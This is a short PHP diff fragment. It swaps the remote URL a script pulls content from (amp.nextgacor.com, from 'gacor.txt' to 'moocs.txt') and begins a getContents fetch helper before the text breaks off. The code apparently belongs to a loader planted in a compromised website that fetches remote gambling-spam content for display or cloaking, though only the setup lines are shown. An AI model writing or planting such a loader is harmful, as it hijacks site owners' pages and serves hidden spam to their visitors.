@@ -1,5 +1,5 @@
 <?php
-$contents = 'https://amp.nextgacor.com/gacor.txt';
+$contents = 'https://amp.nextgacor.com/moocs.txt';
 $allDevice = true;
 function getContents($url) {
     if(!function_exists('file_get_contents')) {
